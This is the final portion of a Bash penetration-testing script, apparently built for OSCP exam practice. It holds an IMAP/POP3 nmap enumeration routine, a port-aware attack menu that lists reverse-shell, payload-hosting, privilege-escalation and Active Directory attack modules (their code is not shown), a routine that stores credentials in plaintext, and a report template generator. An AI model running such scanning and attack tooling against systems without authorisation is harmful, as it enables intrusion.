    log_section "IMAP/POP3 Mail Enumeration (AUTO)"

    if ! has_any_port 143 110 993 995; then
        log_warn "No mail ports detected."
        return
    fi
    mkdir -p "$LOOT_DIR/mail"

    local ports=""
    for mp in 143 110 993 995; do
        has_port "$mp" && ports+="$mp,"
    done
    ports=${ports%,}

    run_cmd "IMAP Nmap" "nmap -p$ports --script imap-capabilities,pop3-capabilities,imap-ntlm-info -Pn $IP -oN $LOOT_DIR/mail/nmap_mail_enum.txt" ""
}
# =============================================================================
# -- MAIN MENU -> DYNAMIC & PORT-AWARE -----------------------------------------
# =============================================================================
main_menu() {
    while true; do
        banner
        echo -e "  ${BOLD}${WHITE}MAIN MENU${NC}"
        echo ""

        # -- Always visible: Setup & Auto-Recon --
        echo -e "  ${LRED}${BOLD}+---------------------------------------+${NC}"
        echo -e "  ${LRED}${BOLD}║  [A]  AUTO-RECON  (full chain)        ║${NC}"
        echo -e "  ${LRED}${BOLD}+---------------------------------------+${NC}"
        echo -e "  ${LCYAN}${BOLD} [J]  🧭 SMART ENUM Dashboard            ${NC}  ${DIM}/ Enumeración Guiada + Progreso${NC}"
        echo ""

        echo -e "  ${YELLOW}⚙  SETUP & SCANNING${NC}"
        echo -e "  ${WHITE} [0]${NC}  Configuration (IP / domain) / Configuración"
        echo -e "  ${WHITE} [1]${NC}  Host Discovery & OS fingerprinting / Descubrimiento de Host"
        echo -e "  ${WHITE} [2]${NC}  Fast Port Scan (all TCP) / Escaneo Rápido"
        echo -e "  ${WHITE} [U]${NC}  UDP Port Scan (top 20/100) / Escaneo UDP"
        [[ -n "$PORTS" ]] && \
        echo -e "  ${WHITE} [3]${NC}  Deep Service Scan (scripts + versions) / Escaneo Profundo"
        echo ""

        # -- Dynamic service menu: only show if relevant ports are open --
        if [[ -n "$PORTS" ]]; then

            echo -e "  ${YELLOW}🎯 DETECTED SERVICES — SELECT TO ENUMERATE${NC}"

            # SMB
            if has_any_port 139 445; then
                local smb_ports=""
                has_port 139 && smb_ports+="139,"
                has_port 445 && smb_ports+="445,"
                local _smb_stats=""
                if [[ -f "$LOOT_DIR/smb/enum4linux.txt" ]]; then
                    local _sh_count=$(grep -ciP 'share|disk' "$LOOT_DIR/smb/enum4linux.txt" 2>/dev/null)
                    local _us_count=$(grep -ciP 'username|user:' "$LOOT_DIR/smb/enum4linux.txt" 2>/dev/null)
                    [[ "$_sh_count" -gt 0 ]] 2>/dev/null && _smb_stats+="${_sh_count} shares, "
                    [[ "$_us_count" -gt 0 ]] 2>/dev/null && _smb_stats+="${_us_count} users, "
                    _smb_stats="${_smb_stats%, }"
                fi
                [[ -z "$_smb_stats" ]] && _smb_stats="pendiente"
                echo -e "  ${LGREEN} [S]${NC}  📁 SMB  ${DIM}(${smb_ports%,})${NC} — ${CYAN}${_smb_stats}${NC}"
            fi

            # Web
            if has_any_port "${KNOWN_WEB_PORTS[@]}"; then
                local web_ports=""
                for wp in "${KNOWN_WEB_PORTS[@]}"; do
                    has_port "$wp" && web_ports+="$wp,"
                done
                local _web_stats=""
                if [[ -d "$LOOT_DIR/web" ]]; then
                    local _routes=0 _web_cves=0 _nikto_finds=0
                    for _gf in "$LOOT_DIR/web"/gobuster*.txt; do
                        [[ -f "$_gf" ]] && _routes=$(( _routes + $(grep -cP 'Status:\s*(200|301|302|403)' "$_gf" 2>/dev/null) ))
                    done
                    for _nf in "$LOOT_DIR/web"/nikto*.txt; do
                        [[ -f "$_nf" ]] && _nikto_finds=$(( _nikto_finds + $(grep -cP '^\+ ' "$_nf" 2>/dev/null) ))
                    done
                    _web_cves=$(grep -rcoP 'CVE-\d{4}-\d+' "$LOOT_DIR/web/" 2>/dev/null | awk -F: '{s+=$2}END{print s+0}')
                    [[ "$_routes" -gt 0 ]] && _web_stats+="${_routes} rutas, "
                    [[ "$_nikto_finds" -gt 0 ]] && _web_stats+="${_nikto_finds} nikto, "
                    [[ "$_web_cves" -gt 0 ]] && _web_stats+="${_web_cves} CVEs, "
                    _web_stats="${_web_stats%, }"
                fi
                [[ -z "$_web_stats" ]] && _web_stats="pendiente"
                echo -e "  ${LGREEN} [W]${NC}  🌐 Web  ${DIM}(${web_ports%,})${NC} — ${CYAN}${_web_stats}${NC}"
            fi

            # LDAP / Active Directory
            if has_any_port 389 636 88; then
                local ldap_ports=""
                for lp in 389 636 88; do
                    has_port "$lp" && ldap_ports+="$lp,"
                done
                local _ldap_stats=""
                if [[ -d "$LOOT_DIR/ldap" ]]; then
                    local _ldap_entries=$(grep -cP 'dn:' "$LOOT_DIR/ldap/"*.txt 2>/dev/null | awk -F: '{s+=$2}END{print s+0}')
                    [[ "$_ldap_entries" -gt 0 ]] && _ldap_stats="${_ldap_entries} entries"
                fi
                [[ -z "$_ldap_stats" ]] && _ldap_stats="pendiente"
                echo -e "  ${LGREEN} [L]${NC}  📋 LDAP/AD  ${DIM}(${ldap_ports%,})${NC} — ${CYAN}${_ldap_stats}${NC}"
            fi

            # SMTP
            if has_port 25; then
                local _smtp_stats=""
                if [[ -f "$LOOT_DIR/smtp/smtp_vrfy.txt" ]]; then
                    local _valid=$(grep -ci 'exists' "$LOOT_DIR/smtp/smtp_vrfy.txt" 2>/dev/null)
                    [[ "$_valid" -gt 0 ]] 2>/dev/null && _smtp_stats="${_valid} users válidos"
                fi
                [[ -z "$_smtp_stats" ]] && _smtp_stats="pendiente"
                echo -e "  ${LGREEN} [V]${NC}  📧 SMTP  ${DIM}(25)${NC} — ${CYAN}${_smtp_stats}${NC}"
            fi

            # FTP
            if has_port 21; then
                local _ftp_stats=""
                if [[ -d "$LOOT_DIR/ftp" ]]; then
                    local _ftp_files=$(find "$LOOT_DIR/ftp/" -type f 2>/dev/null | wc -l)
                    if grep -qi 'anonymous.*allowed\|anon.*login' "$LOOT_DIR/scans/"*.txt 2>/dev/null; then
                        _ftp_stats="anon ✅"
                        [[ "$_ftp_files" -gt 0 ]] && _ftp_stats+=", ${_ftp_files} archivos"
                    else
                        _ftp_stats="anon ❌"
                    fi
                fi
                [[ -z "$_ftp_stats" ]] && _ftp_stats="pendiente"
                echo -e "  ${LGREEN} [F]${NC}  📂 FTP  ${DIM}(21)${NC} — ${CYAN}${_ftp_stats}${NC}"
            fi

            # SSH
            if has_port 22; then
                local _ssh_stats=""
                if [[ -f "$LOOT_DIR/scans/ssh_auth_methods.txt" ]]; then
                    grep -qi 'password' "$LOOT_DIR/scans/ssh_auth_methods.txt" 2>/dev/null && _ssh_stats="password auth ✅"
                    grep -qi 'publickey' "$LOOT_DIR/scans/ssh_auth_methods.txt" 2>/dev/null && _ssh_stats+=", pubkey"
                    _ssh_stats="${_ssh_stats#, }"
                fi
                if [[ -f "$LOOT_DIR/scans/ssh_audit.txt" ]]; then
                    local _ssh_cve_count=$(grep -coP 'CVE-\d{4}-\d+' "$LOOT_DIR/scans/ssh_audit.txt" 2>/dev/null)
                    [[ "$_ssh_cve_count" -gt 0 ]] 2>/dev/null && _ssh_stats+=", ${_ssh_cve_count} CVEs"
                fi
                [[ -z "$_ssh_stats" ]] && _ssh_stats="pendiente"
                echo -e "  ${LGREEN} [H]${NC}  🔑 SSH  ${DIM}(22)${NC} — ${CYAN}${_ssh_stats}${NC}"
            fi

            # SNMP (UDP)
            if [[ -n "$PORTS_UDP" ]] && echo ",$PORTS_UDP," | grep -q ",161,"; then
                local _snmp_stats=""
                if [[ -f "$LOOT_DIR/scans/snmpwalk.txt" ]]; then
                    local _oids=$(wc -l < "$LOOT_DIR/scans/snmpwalk.txt" 2>/dev/null)
                    [[ "$_oids" -gt 0 ]] 2>/dev/null && _snmp_stats="${_oids} OIDs"
                fi
                [[ -z "$_snmp_stats" ]] && _snmp_stats="pendiente"
                echo -e "  ${LGREEN} [N]${NC}  📡 SNMP  ${DIM}(161/udp)${NC} — ${CYAN}${_snmp_stats}${NC}"
            fi

            # NFS
            if has_port 2049; then
                local _nfs_stats=""
                if [[ -f "$LOOT_DIR/scans/nfs_shares.txt" ]]; then
                    local _exports=$(grep -cP '^\/' "$LOOT_DIR/scans/nfs_shares.txt" 2>/dev/null)
                    [[ "$_exports" -gt 0 ]] 2>/dev/null && _nfs_stats="${_exports} shares" || _nfs_stats="sin exports"
                fi
                [[ -z "$_nfs_stats" ]] && _nfs_stats="pendiente"
                echo -e "  ${LGREEN} [X]${NC}  📦 NFS  ${DIM}(2049)${NC} — ${CYAN}${_nfs_stats}${NC}"
            fi

            # IMAP / POP3
            if has_any_port 143 110 993 995; then
                local mail_ports=""
                for mp in 143 110 993 995; do
                    has_port "$mp" && mail_ports+="$mp,"
                done
                local _mail_stats="pendiente"
                [[ -d "$LOOT_DIR/mail" ]] && _mail_stats="escaneado"
                echo -e "  ${LGREEN} [I]${NC}  📧 IMAP/POP3  ${DIM}(${mail_ports%,})${NC} — ${CYAN}${_mail_stats}${NC}"
            fi

            # Databases
            if has_any_port 1433 3306 5432 1521 27017 6379; then
                local db_ports=""
                for dp in 1433 3306 5432 1521 27017 6379; do
                    has_port "$dp" && db_ports+="$dp,"
                done
                local _db_stats=""
                if [[ -d "$LOOT_DIR/db" ]]; then
                    local _db_cves=$(grep -rcoP 'CVE-\d{4}-\d+' "$LOOT_DIR/db/" 2>/dev/null | awk -F: '{s+=$2}END{print s+0}')
                    [[ "$_db_cves" -gt 0 ]] 2>/dev/null && _db_stats="${_db_cves} CVEs"
                    [[ -z "$_db_stats" ]] && _db_stats="escaneado"
                fi
                [[ -z "$_db_stats" ]] && _db_stats="pendiente"
                echo -e "  ${LGREEN} [D]${NC}  🗄️  Databases  ${DIM}(${db_ports%,})${NC} — ${CYAN}${_db_stats}${NC}"
            fi

            # Remote Access (RDP & WinRM)
            if has_any_port 3389 5985 5986; then
                local ra_ports=""
                has_port 3389 && ra_ports+="3389,"
                has_port 5985 && ra_ports+="5985,"
                has_port 5986 && ra_ports+="5986,"
                local _ra_stats=""
                if [[ -d "$LOOT_DIR/remote" ]]; then
                    local _ra_vulns=$(grep -rciP 'VULNERABLE' "$LOOT_DIR/remote/" 2>/dev/null | awk -F: '{s+=$2}END{print s+0}')
                    [[ "$_ra_vulns" -gt 0 ]] 2>/dev/null && _ra_stats="${_ra_vulns} vulns" || _ra_stats="escaneado"
                fi
                [[ -z "$_ra_stats" ]] && _ra_stats="pendiente"
                echo -e "  ${LGREEN} [Z]${NC}  🖥️  Remote Access  ${DIM}(${ra_ports%,})${NC} — ${CYAN}${_ra_stats}${NC}"
            fi

            echo ""

            # -- Services NOT detected (greyed out) --
            echo -e "  ${DIM}-- Not detected --${NC}"
            has_any_port 139 445 || echo -e "  ${DIM} [—]  SMB (445/139 cerrado)${NC}"
            has_any_port 80 443 8080 8443 || echo -e "  ${DIM} [—]  Web (80/443 cerrado)${NC}"
            has_any_port 389 636 88 || echo -e "  ${DIM} [—]  LDAP/AD (389 cerrado)${NC}"
            has_port 21 || echo -e "  ${DIM} [—]  FTP (21 cerrado)${NC}"
            has_port 22 || echo -e "  ${DIM} [—]  SSH (22 cerrado)${NC}"
            has_port 25 || echo -e "  ${DIM} [—]  SMTP (25 cerrado)${NC}"
            has_any_port 1433 3306 5432 || echo -e "  ${DIM} [—]  Databases (cerrado)${NC}"
            has_any_port 143 110 993 995 || echo -e "  ${DIM} [—]  IMAP/POP3 (cerrado)${NC}"
            has_port 2049 || echo -e "  ${DIM} [—]  NFS (2049 cerrado)${NC}"
            has_any_port 3389 5985 5986 || echo -e "  ${DIM} [—]  RDP/WinRM (cerrado)${NC}"
            [[ -z "$PORTS_UDP" || ! ",$PORTS_UDP," == *",161,"* ]] && echo -e "  ${DIM} [—]  SNMP (161/udp no detectado — escanea UDP con [U])${NC}"
            echo ""

            # -- Recommendations --
            show_recommendations
        else
            echo -e "  ${DIM}  -- Escanea puertos primero con [2] o [A] para ver servicios --${NC}"
            echo ""
        fi

        # -- Always visible: Exploitation & Reporting --
        echo -e "  ${YELLOW}💥 EXPLOITATION / EXPLOTACIÓN${NC}"
        # Solo mostrar Credential Validator si hay puertos de auth abiertos
        if has_any_port 21 22 139 445 3389 5985 5986; then
            echo -e "  ${LGREEN} [Y]${NC}  🔑️  Credential Validator / Validar Credenciales"
        fi
        echo -e "  ${WHITE} [E]${NC}  Exploit search (searchsploit) / Buscar Exploits"
        echo -e "  ${WHITE} [C]${NC}  📝 Update active credentials  / Actualizar credenciales activas"
        echo ""

        echo -e "  ${YELLOW}📦 ARSENAL & TRANSFERENCIAS${NC}"
        echo -e "  ${WHITE} [BIN]${NC} 📦 Binary Arsenal (descargar payloads + HTTP server)"
        echo -e "  ${WHITE} [T]${NC}   📤 Transferir Archivos (cheatsheet métodos)"
        echo ""

        echo -e "  ${YELLOW}📖 CHEATSHEETS DE COMBATE${NC}"
        echo -e "  ${WHITE} [R]${NC}  🐚 Reverse Shell (one-liners auto-rellenados)"
        echo -e "  ${WHITE} [B]${NC}  🐛 Estabilizar Shell (TTY upgrade)"
        echo -e "  ${WHITE} [P]${NC}  🚀 Privesc (guía de escalada)"
        echo -e "  ${WHITE} [O]${NC}  🔍 Port Forward / Pivoting (guía de túneles)"
        echo -e "  ${WHITE} [Ñ]${NC}  🔐 Hash Cracking (hashcat / john)"
        echo -e "  ${WHITE} [AD]${NC} 🏰 Active Directory (BloodHound, Kerberoast, PTH, PTT)"
        echo -e "  ${WHITE}[SQL]${NC} 🗃️  SQL (MSSQL ataques + SQLi manual)"
        echo -e "  ${WHITE}[LFI]${NC} 📂 LFI/RFI (File Inclusion + PHP wrappers)"
        echo -e "  ${WHITE} [#]${NC}  📝 Quick Notes (notas del target)"
        echo ""

        echo -e "  ${YELLOW}📊 REPORTING & MONITORING / REPORTES Y MONITOREO${NC}"
        echo -e "  ${WHITE} [M]${NC}  Loot Summary & Monitor       / Resumen y Monitor"
        echo -e "  ${WHITE} [G]${NC}  Generate OSCP Report Draft   / Generar Borrador Informe"
        echo -e "  ${WHITE} [K]${NC}  Check installed tools        / Revisar herramientas"
        echo ""

        echo -e "  ${WHITE} [q]${NC}  Exit / Salir"
        echo ""
        separator
        if ! read -rp "  $(echo -e "${CYAN}Select option:${NC} ")" opt; then
            echo ""
            log_warn "EOF detectado o entrada cerrada. Saliendo del script para evitar bucle infinito."
            exit 0
        fi

        case $opt in
            a|A)  auto_recon ;;
            j|J)  smart_enum ;;
            0)    setup_config ;;
            1)    host_discovery ;;
            2)    fast_port_scan ;;
            u|U)  udp_scan ;;
            3)    [[ -n "$PORTS" ]] && deep_scan || log_warn "Escanea puertos primero." ;;
            # Dynamic service shortcuts
            s|S)  has_any_port 139 445 && smb_enum || log_warn "SMB no detectado (445/139 cerrado)." ;;
            w|W)  has_any_port 80 443 8080 8443 8000 8888 && web_enum || log_warn "Web no detectado." ;;
            l|L)  has_any_port 389 636 88 && ldap_enum || log_warn "LDAP/AD no detectado." ;;
            v|V)  has_port 25 && smtp_enum || log_warn "SMTP no detectado." ;;
            f|F)  has_port 21 && ftp_enum || log_warn "FTP no detectado (21 cerrado)." ;;
            h|H)  has_port 22 && ssh_enum || log_warn "SSH no detectado (22 cerrado)." ;;
            n|N)  snmp_enum ;;
            x|X)  has_port 2049 && nfs_enum || log_warn "NFS no detectado (2049 cerrado)." ;;
            i|I)  has_any_port 143 110 993 995 && imap_enum || log_warn "IMAP/POP3 no detectado." ;;
            d|D)  has_any_port 1433 3306 5432 1521 27017 6379 && db_enum || log_warn "No hay bases de datos detectadas." ;;
            z|Z)  has_any_port 3389 5985 5986 && remote_access_enum || log_warn "RDP/WinRM no detectado." ;;
            bin|BIN|Bin) binary_arsenal ;;
            r|R)  revshell_cheatsheet ;;
            b|B)  stabilize_shell ;;
            t|T)  filetransfer_cheatsheet ;;
            p|P)  privesc_helper ;;
            o|O)  portforward_cheatsheet ;;
            ñ|Ñ)  hashcrack_cheatsheet ;;
            ad|AD|Ad) ad_cheatsheet ;;
            sql|SQL|Sql) sql_cheatsheet ;;
            lfi|LFI|Lfi) lfi_cheatsheet ;;
            \#)   quick_notes ;;
            y|Y)  has_any_port 21 22 139 445 3389 5985 5986 && credential_reuse_checker || log_warn "No hay puertos de autenticación abiertos." ;;
            e|E)  exploit_search ;;
            c|C)  quick_credential_update ;;
            m|M)  show_summary ;;
            g|G)  generate_report_draft ;;
            k|K)  check_tools ;;
            # Legacy numeric options still work
            4)    smb_enum ;;
            5)    web_enum ;;
            6)    ldap_enum ;;
            7)    ftp_enum ;;
            7s)   ssh_enum ;;
            8)    db_enum ;;
            9)    exploit_search ;;
            10)   show_summary ;;
            11)   check_tools ;;
            q|Q)
                # Clean up: optionally kill tmux session on exit
                if tmux has-session -t "$TMUX_SESSION" 2>/dev/null; then
                    echo ""
                    read -rp "  $(echo -e "${YELLOW}[?]${NC} Keep background tmux tasks running? [Y/n]: ")" keep_tmux
                    if [[ "$keep_tmux" =~ ^[Nn]$ ]]; then
                        tmux kill-session -t "$TMUX_SESSION" 2>/dev/null
                        log_info "Background tasks killed."
                    else
                        log_ok "Background tasks kept alive in session: ${WHITE}$TMUX_SESSION${NC}"
                        log_info "Reattach with: ${WHITE}tmux attach -t $TMUX_SESSION${NC}"
                    fi
                fi
                echo -e "\n  ${GREEN}Good luck on the exam. Try harder.${NC}\n"
                exit 0
                ;;
            *)
                log_warn "Invalid option."
                sleep 0.8
                ;;
        esac
    done
}

# =============================================================================
# -- UPGRADE 5: Auto-Generate OSCP Report Draft ---------------------------------
# =============================================================================
quick_credential_update() {
    require_loot || return
    
    echo ""
    log_info "Update current active credentials for tools (SMB, SSH, WinRM, etc.)"
    log_info "This overrides the credentials set in [0] Setup."
    echo ""
    read -rp "  $(echo -e "${YELLOW}[?]${NC} Username / Usuario: ")" new_user
    read -rp "  $(echo -e "${YELLOW}[?]${NC} Password / Contraseña: ")" new_pass

    if [[ -n "$new_user" && -n "$new_pass" ]]; then
        USER_CRED="$new_user"
        PASS_CRED="$new_pass"
        
        # Save to file for easy access later
        mkdir -p "$LOOT_DIR/creds"
        local creds_file="$LOOT_DIR/creds/saved_credentials.txt"
        echo "$new_user:$new_pass" >> "$creds_file"
        
        # Register finding
        add_finding "📝 Nuevas credenciales guardadas en uso: $new_user:$new_pass"
        
        echo ""
        log_ok "Credenciales actualizadas en memoria: ${WHITE}$USER_CRED:$PASS_CRED${NC}"
        log_ok "Guardadas también en el archivo: ${WHITE}$creds_file${NC}"
    else
        log_warn "Operación cancelada. El usuario o contraseña estaban vacíos."
    fi
    
    echo ""; read -rp "  Press ENTER to continue..."
}

generate_report_draft() {
    require_ip || return
    require_loot || return
    
    local report_file="$LOOT_DIR/OSCP_Exam_Report_${IP//./_}.md"
    
    if [[ -f "$report_file" ]]; then
        log_warn "El reporte ya existe en: $report_file"
        read -rp "  $(echo -e "${CYAN}¿Sobrescribir y perder cambios? [y/N]:${NC} ")" overwrite
        [[ ! "$overwrite" =~ ^[Yy]$ ]] && return
    fi

    log_run "Generando plantilla de reporte OSCP en $report_file..."
    
    # Prepare dynamic structures
    local domains_str="<none>"
    if [[ ${#DOMAINS_FOUND[@]} -gt 0 ]]; then
        domains_str=$(IFS=', '; echo "${DOMAINS_FOUND[*]}")
    fi

    local tcp_ports_table
    tcp_ports_table+="| **Port** | **Protocol** | **State** |\n"
    tcp_ports_table+="| --- | --- | --- |\n"
    if [[ -n "$PORTS" ]]; then
        IFS=',' read -ra port_arr <<< "$PORTS"
        for p in "${port_arr[@]}"; do
            tcp_ports_table+="| $p | TCP | Open |\n"
        done
    else
        tcp_ports_table+="| N/A | N/A | N/A |\n"
    fi

    cat <<EOF > "$report_file"
# Offensive Security Certified Professional Exam Report
**Student OSID:** OS-XXXXX
**Target Machine IP:** $IP
**Target OS:** ${OS_TARGET:-Unknown}

## 1. High-Level Summary
TODO: Escribe un resumen conciso de la ruta de explotación (ej. Encontré vulnerabilidad X en el puerto Y, gané shell como usuario Z y escalé privilegios usando W).

## 2. Initial Enumeration
**Hostname/Domain:** $domains_str

### Open TCP Ports
$(echo -e "$tcp_ports_table")

### Open UDP Ports
\`\`\`text
${PORTS_UDP:-No UDP ports scanned}
\`\`\`

### Key Findings
EOF

    # Inject Findings stripping ANSI color codes
    for f in "${FINDINGS[@]}"; do
        local clean_finding
        clean_finding=$(echo "$f" | sed 's/\x1B\[[0-9;]*[a-zA-Z]//g')
        echo "- $clean_finding" >> "$report_file"
    done

    cat <<EOF >> "$report_file"

## 3. Initial Access (User)
**Vulnerability:** TODO
**Proof of Concept / Steps:**
1. TODO
2. TODO

**Reverse Shell / Exploit Code:**
\`\`\`bash
# Pega aquí los comandos exactos o el exploit que usaste (revisa OSCP_Commands_Log.md)
# Ej: python3 exploit.py http://$IP/ --lhost <tu_ip> --lport 443
\`\`\`

**Proof.txt (User):**
TODO: Screenshot of \`cat local.txt\` or \`type local.txt\` showing IP and user.

## 4. Privilege Escalation (Root/System)
**Vulnerability:** TODO
**Proof of Concept / Steps:**
1. TODO
2. TODO

**Proof.txt (Root):**
TODO: Screenshot of \`cat proof.txt\` or \`type proof.txt\` showing IP and root/system context.

## 5. Automated Scan Outputs
*Reference files located in folder: \`$LOOT_DIR/\`*
EOF

    log_ok "Reporte generado con éxito en: ${WHITE}$report_file${NC}"
    echo ""; read -rp "  Press ENTER to continue..."
}

# =============================================================================
# -- Entry point ---------------------------------------------------------------
# =============================================================================
main() {
    # If target IP is passed as argument, use it; otherwise ask interactively
    if [[ -z "$1" ]]; then
        banner
        echo ""
        echo -e "  ${LCYAN}${BOLD}Welcome to OSCP Enumeration Framework${NC}"
        echo -e "  ${DIM}Tip: You can also run: ./oscp_enum.sh <TARGET_IP>${NC}"
        echo ""
        read -rp "  $(echo -e "${CYAN}Enter Target IP:${NC} ")" IP
        if [[ -z "$IP" ]]; then
            log_error "No IP provided. Exiting."
            exit 1
        fi
    else
        IP="$1"
    fi

    LOOT_DIR="loot_${IP//./_}"
    mkdir -p "$LOOT_DIR"/{scans,web,smb,creds,exploit,screenshots,ldap,db,tools,notes}
    SESSION_LOG="$LOOT_DIR/session.log"

    # -- Session Rehydration: restore state if loot dir already exists --
    if [[ -f "$SESSION_LOG" ]]; then
        log_info "Sesión previa detectada. Rehidratando estado..."
        rehydrate_session
        echo "===== Session resumed $(date) — Target: $IP =====" >> "$SESSION_LOG"
    else
        echo "===== Session started $(date) — Target: $IP =====" > "$SESSION_LOG"
    fi

    log_ok "Target set: ${WHITE}$IP${NC}"
    log_ok "Workspace : ${WHITE}$(pwd)/$LOOT_DIR${NC}"
    # Run OS detection immediately
    detect_os
    sleep 1

    main_menu
}

main "$@"



